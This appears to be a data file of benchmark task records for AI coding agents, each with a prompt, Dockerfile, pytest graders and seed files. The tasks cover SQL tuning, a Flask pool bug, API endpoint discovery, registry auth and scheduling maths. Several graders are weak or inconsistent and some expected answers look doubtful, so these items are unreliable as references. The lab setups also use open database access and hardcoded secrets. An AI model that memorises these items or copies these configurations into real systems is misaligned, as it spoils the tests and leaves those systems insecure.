    psql -d testdb -c ""CREATE TABLE orders (id SERIAL PRIMARY KEY, user_id INTEGER REFERENCES users(id), amount DECIMAL(10,2), order_date DATE);"" && \
    psql -d testdb -c ""INSERT INTO users (name, email) SELECT 'User' || generate_series, 'user' || generate_series || '@example.com' FROM generate_series(1, 200000);"" && \
    psql -d testdb -c ""INSERT INTO orders (user_id, amount, order_date) SELECT floor(random() * 200000 + 1)::INTEGER, (random() * 1000)::DECIMAL(10,2), CURRENT_DATE - (random() * 365)::INTEGER FROM generate_series(1, 400000);""

# Switch back to root and create the slow query file
USER root
RUN mkdir -p /app

# Create the slow query file with a correlated subquery performance flaw
RUN echo ""SELECT u.id, u.name, \
       (SELECT COUNT(*) FROM orders o WHERE o.user_id = u.id) as order_count \
FROM users u \
WHERE u.id <= 1000;"" > /app/slow_query.sql

# Configure PostgreSQL to allow connections (find the actual path first)
RUN find /etc/postgresql -name pg_hba.conf -exec sh -c 'echo ""host all all 0.0.0.0/0 md5"" >> {}' \;
RUN find /etc/postgresql -name postgresql.conf -exec sh -c 'echo ""listen_addresses='\''*'\''"" >> {}' \;

# Start PostgreSQL service
USER root
CMD [""/bin/bash"", ""-c"", ""service postgresql start && tail -f /dev/null""]","import os
import subprocess
import time
import re

def test_explain_analysis_used():
    """"""The agent uses `EXPLAIN` to analyze the query plan and identify the bottleneck.""""""
    assert os.path.exists(""/app/optimization_report.md"")
    
    with open(""/app/optimization_report.md"", ""r"") as f:
        content = f.read().upper()
    
    # Check if the report mentions EXPLAIN or query plan analysis
    assert ""EXPLAIN"" in content or ""QUERY PLAN"" in content or ""EXECUTION PLAN"" in content

def test_query_results_match():
    """"""The rewritten query in `/app/fast_query.sql` produces the exact same result set as the original.""""""
    assert os.path.exists(""/app/fast_query.sql"")
    assert os.path.exists(""/app/slow_query.sql"")
    
    # Start PostgreSQL if not running
    subprocess.run([""sudo"", ""-u"", ""postgres"", ""/etc/init.d/postgresql"", ""start""], check=False)
    
    # Execute slow query and capture output
    slow_result = subprocess.run([
        ""sudo"", ""-u"", ""postgres"", ""psql"", ""-d"", ""testdb"", ""-f"", ""/app/slow_query.sql"", ""-t"", ""-A""
    ], capture_output=True, text=True, check=True)
    
    # Execute fast query and capture output
    fast_result = subprocess.run([
        ""sudo"", ""-u"", ""postgres"", ""psql"", ""-d"", ""testdb"", ""-f"", ""/app/fast_query.sql"", ""-t"", ""-A""
    ], capture_output=True, text=True, check=True)
    
    # Compare results (normalize whitespace and sort lines)
    slow_lines = sorted(line.strip() for line in slow_result.stdout.strip().split('\n') if line.strip())
    fast_lines = sorted(line.strip() for line in fast_result.stdout.strip().split('\n') if line.strip())
    
    assert slow_lines == fast_lines

def test_performance_improvement_documented():
    """"""The performance improvement is greater than 30x, and the report clearly explains the change in the query plan (e.g., ""Replaced correlated subquery with a JOIN, allowing for a more efficient Hash Join instead of a Nested Loop"").Total: 1.0""""""
    assert os.path.exists(""/app/fast_query.sql"")
    assert os.path.exists(""/app/optimization_report.md"")
    
    # Start PostgreSQL if not running
    subprocess.run([""sudo"", ""-u"", ""postgres"", ""/etc/init.d/postgresql"", ""start""], check=False)
    
    # Read queries
    with open(""/app/slow_query.sql"", ""r"") as f:
        slow_query = f.read().strip()
    
    with open(""/app/fast_query.sql"", ""r"") as f:
        fast_query = f.read().strip()
    
    # Time slow query execution
    start_time = time.time()
    subprocess.run([
        ""sudo"", ""-u"", ""postgres"", ""psql"", ""-d"", ""testdb"", ""-c"", slow_query
    ], capture_output=True, text=True, check=True)
    slow_time = time.time() - start_time
    
    # Time fast query execution
    start_time = time.time()
    subprocess.run([
        ""sudo"", ""-u"", ""postgres"", ""psql"", ""-d"", ""testdb"", ""-c"", fast_query
    ], capture_output=True, text=True, check=True)
    fast_time = time.time() - start_time
    
    # Check performance improvement is >5x
    improvement = slow_time / fast_time
    assert improvement > 5
    
    # Check if report explains the change
    with open(""/app/optimization_report.md"", ""r"") as f:
        report_content = f.read().lower()
    
    # Check if report mentions key optimization concepts
    has_explanation = (
        (""join"" in report_content and ""subquery"" in report_content) or
        (""hash join"" in report_content) or
        (""nested loop"" in report_content) or
        (""correlated"" in report_content and ""subquery"" in report_content)
    )
    
    assert has_explanation","{""test_explain_analysis_used"": 0.2, ""test_query_results_match"": 0.35, ""test_performance_improvement_documented"": 0.45}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
draft_dp_3dbcf658,medium,draft_dp_3dbcf658,mathematics,The backup collision detector is showing wrong maintenance windows. Fix it to correctly find the largest guaranteed gap between backups across all our periodic schedules.,mathematics,algorithms|scheduling|python,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

COPY collision_detector.py /app/
COPY backup_config.json /app/

RUN chmod +x collision_detector.py

CMD [""/bin/bash""]","import subprocess
import json

def test_basic_schedule_gap():
    """"""Test that the detector finds correct maintenance window for basic schedules""""""
    # Run the collision detector
    result = subprocess.run(['python', 'collision_detector.py'], capture_output=True, text=True)
    
    # Read the output
    with open('maintenance_windows.txt', 'r') as f:
        lines = f.readlines()
    
    # Extract the window value
    window_line = lines[0]
    window_minutes = int(window_line.split(':')[1].strip().split()[0])
    
    # For periods 1440, 360, 720 the guaranteed max gap should be 360 minutes
    # This is because backups occur every 360 minutes in the worst case alignment
    assert window_minutes == 360, f""Expected 360 minutes, got {window_minutes}""
    
    return True

def test_edge_case_coprime_periods():
    """"""Test that the detector handles coprime periods correctly""""""
    # Create a test config with coprime periods
    test_config = {
        ""schedules"": [
            {""name"": ""Backup A"", ""period_minutes"": 60},
            {""name"": ""Backup B"", ""period_minutes"": 77}
        ]
    }
    
    # Write test config
    with open('backup_config.json', 'w') as f:
        json.dump(test_config, f)
    
    # Run the detector
    subprocess.run(['python', 'collision_detector.py'], capture_output=True, text=True)
    
    # Read result
    with open('maintenance_windows.txt', 'r') as f:
        lines = f.readlines()
    
    window_minutes = int(lines[0].split(':')[1].strip().split()[0])
    
    # For coprime periods 60 and 77, the max guaranteed gap is 60 minutes
    assert window_minutes == 60, f""Expected 60 minutes for coprime periods, got {window_minutes}""
    
    return True","{""test_basic_schedule_gap"": 0.6, ""test_edge_case_coprime_periods"": 0.4}","{""backup_config.json"": ""{\n    \""schedules\"": [\n        {\n            \""name\"": \""Database Full Backup\"",\n            \""period_minutes\"": 1440\n        },\n        {\n            \""name\"": \""Application State Backup\"", \n            \""period_minutes\"": 360\n        },\n        {\n            \""name\"": \""Log Rotation Backup\"",\n            \""period_minutes\"": 720\n        }\n    ]\n}"", ""collision_detector.py"": ""#!/usr/bin/env python3\nimport json\nimport datetime\nfrom typing import List, Dict, Tuple\n\ndef load_backup_schedules(config_file: str) -> List[Dict]:\n    \""\""\""Load backup schedules from JSON config\""\""\""\n    with open(config_file, 'r') as f:\n        return json.load(f)['schedules']\n\ndef find_max_maintenance_window(schedules: List[Dict]) -> int:\n    \""\""\""Find the maximum guaranteed maintenance window between backups.\n    \n    Returns the largest gap (in minutes) that is guaranteed to exist\n    between any backup jobs, regardless of when each schedule started.\n    \""\""\""\n    # Current buggy implementation\n    periods = [s['period_minutes'] for s in schedules]\n    \n    # Bug: Just returns the minimum period divided by 2\n    # This is completely wrong for finding guaranteed gaps\n    return min(periods) // 2\n\ndef main():\n    schedules = load_backup_schedules('backup_config.json')\n    \n    max_window = find_max_maintenance_window(schedules)\n    \n    # Log the result\n    with open('maintenance_windows.txt', 'w') as f:\n        f.write(f\""Maximum guaranteed maintenance window: {max_window} minutes\\n\"")\n        f.write(f\""Analyzed {len(schedules)} backup schedules\\n\"")\n    \n    print(f\""Maximum guaranteed maintenance window: {max_window} minutes\"")\n\nif __name__ == \""__main__\"":\n    main()""}",2025-07-21T09:18:10.316899,2025-07-21T09:18:10.316899
draft_dp_407ad92c,medium,draft_dp_407ad92c,debugging,The Flask app is down - getting connection pool errors when hitting /users endpoint. Fix it so it returns the user data.,debugging,python|troubleshooting|web,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

RUN apt-get update && apt-get install -y \
    postgresql \
    postgresql-client \
    sudo \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /app

RUN pip install flask psycopg2-binary

COPY app.py /app/
COPY config.py /app/
COPY init_db.sql /app/

RUN service postgresql start && \
    sudo -u postgres psql -c ""CREATE USER appuser WITH PASSWORD 'wrongpass';"" && \
    sudo -u postgres createdb -O appuser appdb && \
    sudo -u postgres psql appdb < /app/init_db.sql && \
    service postgresql stop

RUN echo ""host all all 127.0.0.1/32 md5"" >> /etc/postgresql/15/main/pg_hba.conf && \
    echo ""local all all md5"" >> /etc/postgresql/15/main/pg_hba.conf

CMD [""sh"", ""-c"", ""service postgresql start && sleep 2 && /bin/bash""]","import subprocess
import json
import time
import threading

def test_users_endpoint_returns_data():
    """"""Test that the /users endpoint returns valid JSON with user data""""""
    # Give the app time to start if needed
    time.sleep(2)
    
    result = subprocess.run(
        ['curl', '-s', 'http://localhost:5000/users'],
        capture_output=True,
        text=True
    )
    
    assert result.returncode == 0, f""curl failed with return code {result.returncode}""
    
    # Parse JSON response
    try:
        data = json.loads(result.stdout)
    except json.JSONDecodeError:
        assert False, f""Response is not valid JSON: {result.stdout}""
    
    # Verify we got a list of users
    assert isinstance(data, list), f""Expected list, got {type(data)}""
    assert len(data) >= 5, f""Expected at least 5 users, got {len(data)}""
    
    # Check first user has expected fields
    if data:
        user = data[0]
        assert 'id' in user, ""User missing 'id' field""
        assert 'name' in user, ""User missing 'name' field""  
        assert 'email' in user, ""User missing 'email' field""

def test_concurrent_requests_succeed():
    """"""Test that multiple concurrent requests work (connection pool is functional)""""""
    time.sleep(2)
    
    results = []
    errors = []
    
    def make_request():
        try:
            result = subprocess.run(
                ['curl', '-s', '-w', '%{http_code}', 'http://localhost:5000/users'],
                capture_output=True,
                text=True
            )
            results.append(result.stdout)
        except Exception as e:
            errors.append(str(e))
    
    # Create 5 concurrent requests
    threads = []
    for _ in range(5):
        t = threading.Thread(target=make_request)
        threads.append(t)
        t.start()
    
    # Wait for all threads
    for t in threads:
        t.join(timeout=10)
    
    assert len(errors) == 0, f""Errors occurred: {errors}""
    assert len(results) == 5, f""Expected 5 results, got {len(results)}""
    
    # All requests should return 200
    for result in results:
        assert result.endswith('200'), f""Request did not return 200: {result[-3:]}""","{""test_users_endpoint_returns_data"": 0.6, ""test_concurrent_requests_succeed"": 0.4}","{""init_db.sql"": ""CREATE TABLE IF NOT EXISTS users (\n    id SERIAL PRIMARY KEY,\n    name VARCHAR(100) NOT NULL,\n    email VARCHAR(100) UNIQUE NOT NULL\n);\n\nINSERT INTO users (name, email) VALUES \n    ('Alice Johnson', 'alice@example.com'),\n    ('Bob Smith', 'bob@example.com'),\n    ('Charlie Brown', 'charlie@example.com'),\n    ('Diana Prince', 'diana@example.com'),\n    ('Eve Wilson', 'eve@example.com');"", ""config.py"": ""DB_CONFIG = {\n    'host': 'localhost',\n    'database': 'appdb',\n    'user': 'appuser',\n    'password': 'correctpass',  # Wrong password - should be 'wrongpass'\n    'port': 5432\n}"", ""app.py"": ""from flask import Flask, jsonify\nimport psycopg2\nfrom psycopg2 import pool\nfrom config import DB_CONFIG\nimport threading\n\napp = Flask(__name__)\n\nconnection_pool = None\npool_lock = threading.Lock()\n\ndef init_pool():\n    global connection_pool\n    try:\n        connection_pool = psycopg2.pool.SimpleConnectionPool(\n            1, 2,\n            host=DB_CONFIG['host'],\n            database=DB_CONFIG['database'],\n            user=DB_CONFIG['user'],\n            password=DB_CONFIG['password'],\n            port=DB_CONFIG['port']\n        )\n    except Exception as e:\n        print(f\""Error creating connection pool: {e}\"")\n        connection_pool = None\n\n@app.route('/users')\ndef get_users():\n    if not connection_pool:\n        return jsonify({'error': 'Database connection pool not initialized'}), 500\n    \n    try:\n        with pool_lock:\n            conn = connection_pool.getconn()\n        \n        cursor = conn.cursor()\n        cursor.execute(\""SELECT id, name, email FROM users\"")\n        users = cursor.fetchall()\n        cursor.close()\n        \n        with pool_lock:\n            connection_pool.putconn(conn)\n        \n        user_list = [{'id': u[0], 'name': u[1], 'email': u[2]} for u in users]\n        return jsonify(user_list)\n    \n    except Exception as e:\n        return jsonify({'error': str(e)}), 500\n\nif __name__ == '__main__':\n    init_pool()\n    app.run(host='0.0.0.0', port=5000, threaded=True)""}",2025-07-21T09:41:15.815620,2025-07-21T09:41:56.692161
draft_dp_023083aa,hard,draft_dp_023083aa,software-engineering,"Build a tool to discover all endpoints in our local API server. Need to find both public and authenticated endpoints, handle rate limiting, and output the results as structured JSON.",software-engineering,api|python|networking,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

COPY requirements.txt /app/
RUN pip install -r requirements.txt

COPY api_server.py /app/

RUN echo '#!/bin/bash\npython /app/api_server.py &\nsleep 3' > /app/start_server.sh
RUN chmod +x /app/start_server.sh

CMD [""/bin/bash""]","import subprocess
import json
import os

def test_endpoint_discovery():
    """"""Test that the discovery tool finds all public and authenticated endpoints""""""
    # Look for the discovery tool output
    output_files = []
    for fname in ['endpoints.json', 'discovered_endpoints.json', 'api_map.json', 'discovery_results.json']:
        if os.path.exists(f'/app/{fname}'):
            output_files.append(f'/app/{fname}')
    
    if not output_files:
        # Try to find any JSON output file
        result = subprocess.run(['find', '/app', '-name', '*.json', '-type', 'f'], 
                              capture_output=True, text=True)
        if result.returncode == 0:
            output_files = [f.strip() for f in result.stdout.strip().split('\n') if f.strip() and 'api' in f.lower()]
    
    assert output_files, ""No discovery output file found""
    
    # Read the discovery results
    with open(output_files[0], 'r') as f:
        discovered = json.load(f)
    
    # Check that key endpoints were discovered
    endpoints_found = []
    
    # Extract endpoints from various possible formats
    if isinstance(discovered, dict):
        if 'endpoints' in discovered:
            endpoints_found = discovered['endpoints']
        elif 'discovered' in discovered:
            endpoints_found = discovered['discovered']
        else:
            # Try to extract from nested structure
            for key, value in discovered.items():
                if isinstance(value, list):
                    endpoints_found.extend(value)
                elif isinstance(value, dict) and 'path' in value:
                    endpoints_found.append(value['path'])
    elif isinstance(discovered, list):
        endpoints_found = discovered
    
    # Normalize endpoint paths
    paths = set()
    for item in endpoints_found:
        if isinstance(item, str):
            paths.add(item)
        elif isinstance(item, dict):
            if 'path' in item:
                paths.add(item['path'])
            elif 'endpoint' in item:
                paths.add(item['endpoint'])
            elif 'url' in item:
                paths.add(item['url'].replace('http://localhost:8000', ''))
    
    # Must find these public endpoints
    required_public = ['/api/v1/users', '/api/v1/products', '/api/v1/users/{id}']
    for endpoint in required_public:
        found = any(endpoint in p or endpoint.replace('{id}', '1') in p for p in paths)
        assert found, f""Public endpoint {endpoint} not discovered""
    
    # Must find admin endpoints (with auth)
    admin_found = any('/admin' in p for p in paths)
    assert admin_found, ""Protected admin endpoints not discovered""
    
    return True

def test_http_methods_identified():
    """"""Test that different HTTP methods are correctly identified""""""
    # Find the output file
    output_file = None
    for fname in ['endpoints.json', 'discovered_endpoints.json', 'api_map.json', 'discovery_results.json']:
        if os.path.exists(f'/app/{fname}'):
            output_file = f'/app/{fname}'
            break
    
    if not output_file:
        result = subprocess.run(['find', '/app', '-name', '*.json', '-type', 'f'], 
                              capture_output=True, text=True)
        if result.returncode == 0:
            files = [f.strip() for f in result.stdout.strip().split('\n') if f.strip()]
            output_file = files[0] if files else None
    
    assert output_file, ""No discovery output file found""
    
    with open(output_file, 'r') as f:
        discovered = json.load(f)
    
    # Check for HTTP method information
    methods_found = False
    
    if isinstance(discovered, dict):
        for key, value in discovered.items():
            if isinstance(value, list):
                for item in value:
                    if isinstance(item, dict) and ('methods' in item or 'method' in item):
                        methods_found = True
                        break
            elif isinstance(value, dict) and ('methods' in value or 'method' in value):
                methods_found = True
                break
    elif isinstance(discovered, list):
        for item in discovered:
            if isinstance(item, dict) and ('methods' in item or 'method' in item):
                methods_found = True
                break
    
    assert methods_found, ""HTTP methods not identified in discovery output""
    
    return True","{""test_endpoint_discovery"": 0.7, ""test_http_methods_identified"": 0.3}","{""requirements.txt"": ""fastapi==0.104.1\nuvicorn==0.24.0\nrequests==2.31.0"", ""api_server.py"": ""from fastapi import FastAPI, HTTPException, Header, Response\nfrom fastapi.responses import JSONResponse\nfrom typing import Optional\nimport time\nfrom datetime import datetime\n\napp = FastAPI()\n\n# Rate limiting\nrequest_counts = {}\nRATE_LIMIT = 10\nRATE_WINDOW = 60\n\ndef check_rate_limit(client_id: str):\n    current_time = time.time()\n    if client_id not in request_counts:\n        request_counts[client_id] = []\n    \n    request_counts[client_id] = [t for t in request_counts[client_id] if current_time - t < RATE_WINDOW]\n    \n    if len(request_counts[client_id]) >= RATE_LIMIT:\n        return False\n    \n    request_counts[client_id].append(current_time)\n    return True\n\n@app.middleware(\""http\"")\nasync def rate_limit_middleware(request, call_next):\n    client_id = request.client.host\n    if not check_rate_limit(client_id):\n        return JSONResponse(\n            status_code=429,\n            content={\""error\"": \""Rate limit exceeded\""},\n            headers={\""Retry-After\"": \""60\""}\n        )\n    response = await call_next(request)\n    return response\n\n# Public endpoints\n@app.get(\""/\"")\ndef root():\n    return {\n        \""message\"": \""API Server\"",\n        \""version\"": \""1.0\"",\n        \""_links\"": {\n            \""users\"": \""/api/v1/users\"",\n            \""products\"": \""/api/v1/products\""\n        }\n    }\n\n@app.get(\""/api/v1/users\"")\ndef get_users():\n    return {\n        \""users\"": [\n            {\""id\"": 1, \""name\"": \""Alice\""},\n            {\""id\"": 2, \""name\"": \""Bob\""}\n        ],\n        \""_links\"": {\n            \""self\"": \""/api/v1/users\"",\n            \""user\"": \""/api/v1/users/{id}\""\n        }\n    }\n\n@app.get(\""/api/v1/users/{user_id}\"")\ndef get_user(user_id: int):\n    return {\""id\"": user_id, \""name\"": f\""User{user_id}\""}\n\n@app.post(\""/api/v1/users\"")\ndef create_user():\n    return {\""id\"": 3, \""name\"": \""Charlie\""}\n\n@app.get(\""/api/v1/products\"")\ndef get_products():\n    return {\n        \""products\"": [\n            {\""id\"": 1, \""name\"": \""Widget\""},\n            {\""id\"": 2, \""name\"": \""Gadget\""}\n        ]\n    }\n\n@app.get(\""/api/v1/products/{product_id}\"")\ndef get_product(product_id: int):\n    return {\""id\"": product_id, \""name\"": f\""Product{product_id}\""}\n\n@app.delete(\""/api/v1/products/{product_id}\"")\ndef delete_product(product_id: int):\n    return {\""message\"": f\""Product {product_id} deleted\""}\n\n# Protected endpoints\n@app.get(\""/api/v1/admin\"")\ndef admin_panel(authorization: Optional[str] = Header(None)):\n    if authorization != \""Bearer secret-token\"":\n        raise HTTPException(status_code=404, detail=\""Not found\"")\n    return {\n        \""admin\"": True,\n        \""_links\"": {\n            \""stats\"": \""/api/v1/admin/stats\"",\n            \""config\"": \""/api/v1/admin/config\""\n        }\n    }\n\n@app.get(\""/api/v1/admin/stats\"")\ndef admin_stats(authorization: Optional[str] = Header(None)):\n    if authorization != \""Bearer secret-token\"":\n        raise HTTPException(status_code=404, detail=\""Not found\"")\n    return {\""total_users\"": 100, \""total_products\"": 50}\n\n@app.put(\""/api/v1/admin/config\"")\ndef update_config(authorization: Optional[str] = Header(None)):\n    if authorization != \""Bearer secret-token\"":\n        raise HTTPException(status_code=404, detail=\""Not found\"")\n    return {\""message\"": \""Config updated\""}\n\n# Hidden endpoint\n@app.get(\""/api/v1/debug\"")\ndef debug_info():\n    return {\""debug\"": True, \""timestamp\"": datetime.now().isoformat()}\n\nif __name__ == \""__main__\"":\n    import uvicorn\n    uvicorn.run(app, host=\""0.0.0.0\"", port=8000)""}",2025-07-21T09:48:01.745871,2025-07-21T09:48:01.745871
draft_dp_e853b687,hard,draft_dp_e853b687,system-administration,The private registry at registry.internal:5000 is rejecting all pulls/pushes with auth errors. Need to fix the authentication chain so our CI/CD can deploy again.,system-administration,sys-admin|networking|troubleshooting,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

# Install required packages
RUN apt-get update && apt-get install -y \
    docker.io \
    nginx \
    apache2-utils \
    openssl \
    curl \
    jq \
    && rm -rf /var/lib/apt/lists/*

# Copy configuration files
COPY nginx.conf /etc/nginx/nginx.conf
COPY htpasswd /etc/nginx/.htpasswd
COPY registry-config.yml /etc/docker/registry/config.yml
COPY setup.sh /setup.sh

# Make setup executable
RUN chmod +x /setup.sh

# Create necessary directories
RUN mkdir -p /var/lib/registry /etc/docker/certs.d/registry.internal:5000

# Set working directory
WORKDIR /workspace

# Run setup on container start
CMD [""/bin/bash"", ""-c"", ""/setup.sh && exec bash""]","import subprocess
import json

def test_docker_pull_works():
    """"""Test that docker pull from the registry succeeds""""""
    result = subprocess.run(
        [""docker"", ""pull"", ""registry.internal:5000/test/app:latest""],
        capture_output=True,
        text=True
    )
    return result.returncode == 0

def test_docker_push_works():
    """"""Test that docker push to the registry succeeds""""""
    # First tag an image
    tag_result = subprocess.run(
        [""docker"", ""tag"", ""alpine:latest"", ""registry.internal:5000/test/pushed:v1""],
        capture_output=True,
        text=True
    )
    if tag_result.returncode != 0:
        return False
    
    # Then push it
    push_result = subprocess.run(
        [""docker"", ""push"", ""registry.internal:5000/test/pushed:v1""],
        capture_output=True,
        text=True
    )
    return push_result.returncode == 0

def test_auth_is_enforced():
    """"""Test that unauthenticated requests are rejected""""""
    # Try to access registry API without auth
    result = subprocess.run(
        [""curl"", ""-k"", ""-s"", ""-o"", ""/dev/null"", ""-w"", ""%{http_code}"", 
         ""https://registry.internal:5000/v2/""],
        capture_output=True,
        text=True
    )
    # Should return 401 Unauthorized
    return result.stdout.strip() == ""401""","{""test_docker_pull_works"": 0.4, ""test_docker_push_works"": 0.4, ""test_auth_is_enforced"": 0.2}","{""setup.sh"": ""#!/bin/bash\n\n# Generate self-signed certificate with wrong CN\nmkdir -p /etc/nginx/certs\nopenssl req -x509 -nodes -days 365 -newkey rsa:2048 \\\n    -keyout /etc/nginx/certs/registry.key \\\n    -out /etc/nginx/certs/registry.crt \\\n    -subj \""/C=US/ST=State/L=City/O=Org/CN=wrongname.local\""\n\n# Add hosts entry\necho \""127.0.0.1 registry.internal\"" >> /etc/hosts\n\n# Start docker daemon\ndockerd &\nsleep 5\n\n# Start registry\ndocker run -d --name registry -p 5001:5000 \\\n    -v /etc/docker/registry:/etc/docker/registry \\\n    -v /var/lib/registry:/var/lib/registry \\\n    registry:2\n\n# Create test image\necho \""FROM alpine:latest\"" > /tmp/Dockerfile\necho \""CMD echo 'test app'\"" >> /tmp/Dockerfile\ndocker build -t localhost:5001/test/app:latest /tmp/\n\n# Start nginx\nnginx -c /etc/nginx/nginx.conf"", ""registry-config.yml"": ""version: 0.1\nlog:\n  level: info\nstorage:\n  filesystem:\n    rootdirectory: /var/lib/registry\nhttp:\n  addr: :5001\n  headers:\n    X-Content-Type-Options: [nosniff]"", ""htpasswd"": ""testuser:wrongformat123"", ""nginx.conf"": ""events {\n    worker_connections 1024;\n}\n\nhttp {\n    upstream docker-registry {\n        server localhost:5001;\n    }\n\n    server {\n        listen 5000 ssl;\n        server_name registry.internal;\n\n        ssl_certificate /etc/nginx/certs/registry.crt;\n        ssl_certificate_key /etc/nginx/certs/registry.key;\n\n        client_max_body_size 0;\n\n        location / {\n            auth_basic \""Registry Authentication\"";\n            auth_basic_user_file /etc/nginx/.htpasswd;\n\n            proxy_pass http://docker-registry;\n            proxy_set_header Host $host;\n            proxy_set_header X-Real-IP $remote_addr;\n            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n            proxy_set_header X-Forwarded-Proto $scheme;\n        }\n    }\n}""}",2025-07-21T09:48:08.576150,2025-07-21T09:48:08.576150
draft_dp_b5f18207,extremely_hard,draft_dp_b5f18207,scientific-computing,Need to find the maximum guaranteed blackout period for our ground station given the satellite data in satellites.json. Calculate when we'll definitely have no coverage regardless of current orbital positions and write the result (in minutes) to blackout_analysis.txt.,scientific-computing,python|algorithms|mathematics,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

# Copy satellite data
COPY satellites.json /app/

# Install numpy for calculations
RUN pip install numpy

CMD [""/bin/bash""]","import os
import subprocess

def test_blackout_analysis_file_exists():
    """"""Test that the blackout analysis file was created""""""
    assert os.path.exists('/app/blackout_analysis.txt'), ""blackout_analysis.txt file not found""

def test_blackout_duration_calculated():
    """"""Test that a valid blackout duration was calculated and written""""""
    with open('/app/blackout_analysis.txt', 'r') as f:
        content = f.read().strip()
    
    # Check that content is a number (float or int)
    try:
        duration = float(content)
        assert duration > 0, f""Blackout duration should be positive, got {duration}""
        assert duration < 1000, f""Blackout duration seems unreasonably large: {duration}""
    except ValueError:
        assert False, f""blackout_analysis.txt should contain a number, got: {content}""","{""test_blackout_analysis_file_exists"": 0.3, ""test_blackout_duration_calculated"": 0.7}","{""satellites.json"": ""{\n  \""satellites\"": [\n    {\n      \""name\"": \""SAT-1\"",\n      \""orbital_period\"": 90,\n      \""visibility_percentage\"": 15\n    },\n    {\n      \""name\"": \""SAT-2\"", \n      \""orbital_period\"": 120,\n      \""visibility_percentage\"": 20\n    },\n    {\n      \""name\"": \""SAT-3\"",\n      \""orbital_period\"": 105,\n      \""visibility_percentage\"": 12\n    },\n    {\n      \""name\"": \""SAT-4\"",\n      \""orbital_period\"": 95,\n      \""visibility_percentage\"": 18\n    }\n  ]\n}""}",2025-07-21T09:50:30.251348,2025-07-21T09:50:30.251348
draft_dp_6a1bc409,hard,draft_dp_6a1bc409,software-engineering,Traffic lights are all going red at once. Find when this happens longest and fix the phase timing. Output the max all-red duration to traffic_analysis.txt.,software-engineering,python|algorithms|optimization,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

# Install required Python packages
RUN pip install pandas matplotlib numpy

# Copy the traffic light system files
COPY traffic_sync.py /app/
COPY intersections.csv /app/
COPY analyze_traffic.py /app/

# Make sure the working directory is set
WORKDIR /app

CMD [""/bin/bash""]","import os
import subprocess
import re

def test_traffic_analysis_output():
    """"""Test that traffic_analysis.txt contains the correct maximum all-red duration""""""
    # Check if the analysis file exists
    assert os.path.exists(""/app/traffic_analysis.txt""), ""traffic_analysis.txt file not found""
    
    # Read the content
    with open(""/app/traffic_analysis.txt"", ""r"") as f:
        content = f.read().strip()
    
    # Extract the number from the file
    match = re.search(r'(\d+(?:\.\d+)?)', content)
    assert match, ""No numeric value found in traffic_analysis.txt""
    
    max_duration = float(match.group(1))
    
    assert max_duration < 5.0, f""Maximum all-red duration {max_duration} is too high - synchronization not properly optimized""
    assert max_duration >= 0, ""Maximum all-red duration cannot be negative""

def test_phase_optimization_applied():
    """"""Test that the solution actually optimizes phase offsets""""""
    # Run a simple check to see if optimization code exists
    result = subprocess.run(
        [""python"", ""-c"", ""from traffic_sync import TrafficSynchronizer; s = TrafficSynchronizer(); s.load_intersections('intersections.csv'); print(any(light.phase_offset != 0 for light in s.intersections) if hasattr(s.intersections[0], 'phase_offset') else False)""],
        capture_output=True,
        text=True,
        cwd=""/app""
    )
    
    assert result.returncode == 0, ""Failed to check phase offsets""","{""test_traffic_analysis_output"": 0.7, ""test_phase_optimization_applied"": 0.3}","{""traffic_sync.py"": ""import pandas as pd\nimport numpy as np\nimport matplotlib.pyplot as plt\nfrom typing import List, Tuple, Dict\n\nclass TrafficLight:\n    def __init__(self, intersection_id: str, green_time: int, yellow_time: int, red_time: int):\n        self.id = intersection_id\n        self.green_time = green_time\n        self.yellow_time = yellow_time\n        self.red_time = red_time\n        self.cycle_time = green_time + yellow_time + red_time\n        self.phase_offset = 0\n        \n    def get_state_at_time(self, t: int) -> str:\n        \""\""\""Get the light state at a given time\""\""\""\n        effective_time = (t + self.phase_offset) % self.cycle_time\n        if effective_time < self.green_time:\n            return \""green\""\n        elif effective_time < self.green_time + self.yellow_time:\n            return \""yellow\""\n        else:\n            return \""red\""\n    \n    def get_red_periods(self, max_time: int) -> List[Tuple[int, int]]:\n        \""\""\""Get all red periods within the given time range\""\""\""\n        periods = []\n        for cycle_start in range(0, max_time, self.cycle_time):\n            red_start = cycle_start + self.green_time + self.yellow_time - self.phase_offset\n            red_end = red_start + self.red_time\n            if red_start < max_time:\n                periods.append((max(0, red_start), min(max_time, red_end)))\n        return periods\n\n\nclass TrafficSynchronizer:\n    def __init__(self):\n        self.intersections: List[TrafficLight] = []\n        \n    def load_intersections(self, csv_file: str):\n        \""\""\""Load intersection data from CSV\""\""\""\n        df = pd.read_csv(csv_file)\n        for _, row in df.iterrows():\n            light = TrafficLight(\n                row['intersection_id'],\n                row['green_time'],\n                row['yellow_time'],\n                row['red_time']\n            )\n            self.intersections.append(light)\n    \n    def find_all_red_periods(self, duration: int = 300) -> List[Tuple[int, int]]:\n        \""\""\""Find periods where ALL lights are red\""\""\""\n        if not self.intersections:\n            return []\n        \n        all_red_times = []\n        for t in range(duration):\n            all_red = True\n            for light in self.intersections:\n                if light.get_state_at_time(t) != \""red\"":\n                    all_red = False\n                    break\n            if all_red:\n                all_red_times.append(t)\n        \n        # Convert discrete times to periods\n        periods = []\n        if all_red_times:\n            start = all_red_times[0]\n            for i in range(1, len(all_red_times)):\n                if all_red_times[i] != all_red_times[i-1] + 1:\n                    periods.append((start, all_red_times[i-1]))\n                    start = all_red_times[i]\n            periods.append((start, all_red_times[-1]))\n        \n        return periods\n    \n    def calculate_max_all_red_duration(self) -> float:\n        \""\""\""Calculate the maximum all-red duration\""\""\""\n        periods = self.find_all_red_periods()\n        if not periods:\n            return 0\n        \n        max_duration = 0\n        for start, end in periods:\n            duration = end - start + 1\n            max_duration = max(max_duration, duration)\n        \n        return max_duration\n    \n    def optimize_phase_offsets(self):\n        \""\""\""Optimize phase offsets to minimize all-red periods\""\""\""\n        for i, light in enumerate(self.intersections):\n            light.phase_offset = i * 10  # Arbitrary offset\n    \n    def visualize_timing(self, duration: int = 100):\n        \""\""\""Create a timing 